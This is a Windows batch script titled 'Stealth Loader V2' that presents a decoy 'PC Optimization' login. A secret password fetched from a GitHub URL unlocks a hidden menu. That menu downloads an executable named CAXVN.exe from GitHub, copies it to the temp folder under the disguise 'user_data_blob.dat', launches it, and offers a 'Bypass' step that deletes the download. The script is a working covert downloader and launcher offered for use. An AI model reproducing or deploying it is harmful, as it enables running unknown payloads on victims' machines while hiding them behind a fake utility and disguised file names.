@echo off
setlocal enabledelayedexpansion

:LOGIN
cls
echo ==========================================
echo           STEALTH LOADER V2
echo ==========================================
echo.
set /p "userpass=Enter Password: "

:: Check password '1' for PC Optimization
if "%userpass%"=="1" (
    echo Launching PC Optimization Menu...
    timeout /t 2 >nul
    goto :EOF
)

:: Check secret password from GitHub
echo Verifying secret password...
curl -s -o "%temp%\remote_pass.txt" "https://raw.githubusercontent.com/maxyprime/stealthloaderv2/refs/heads/main/password.txt"
set /p secret=<"%temp%\remote_pass.txt"
del "%temp%\remote_pass.txt" >nul 2>&1

if /i "%userpass%"=="%secret%" (
    goto :STEALTH_MENU
) else (
    echo Incorrect password. Try again.
    timeout /t 2 >nul
    goto :LOGIN
)

:STEALTH_MENU
cls
echo.
echo ========== STEALTH MENU ==========
echo 1. Setup
echo 2. Run
echo 3. Bypass
echo 4. Exit
echo ==================================
set /p "choice=Choose an option: "

if "%choice%"=="1" goto :SETUP
if "%choice%"=="2" goto :RUN
if "%choice%"=="3" goto :BYPASS
if "%choice%"=="4" exit

echo Invalid choice.
timeout /t 2 >nul
goto :STEALTH_MENU

:SETUP
echo.
echo [*] STEP 1: Initializing setup...
timeout /t 1 >nul
echo [*] STEP 2: Connecting to GitHub...
timeout /t 1 >nul
echo [*] STEP 3: Downloading payload...
set "RAW_EXE_URL=https://raw.githubusercontent.com/maxyprime/stealthloaderv2/main/CAXVN.exe"
set "TEMP_EXE=%temp%\CAXVN.exe"
set "DISGUISED_EXE=%temp%\user_data_blob.dat"

curl -s -L -o "%TEMP_EXE%" "%RAW_EXE_URL%"

if exist "%TEMP_EXE%" (
    echo [*] Download complete. Renaming to disguised file...
    copy /Y "%TEMP_EXE%" "%DISGUISED_EXE%" >nul
    echo [✔] Setup successful. Disguised EXE ready.
) else (
    echo [!] Failed to download the EXE. Please check your internet or GitHub URL.
)

pause
goto STEALTH_MENU


:RUN
echo Preparing to launch EXE...

if not exist "%DISGUISED_EXE%" (
    echo [!] Disguised EXE not found. Please run Setup first.
    pause
    goto STEALTH_MENU
)

start "" "%DISGUISED_EXE%"

:: Wait for the EXE to finish before continuing cleanup
:WAIT_LOOP
timeout /t 2 >nul
tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /I "user_data_blob.dat" >nul
if not errorlevel 1 (
    goto WAIT_LOOP
)

echo EXE closed.
pause
goto STEALTH_MENU



:BYPASS
echo Cleaning up...
del /f /q "%TEMP_EXE%" >nul 2>&1
echo Done.
pause
goto :STEALTH_MENU

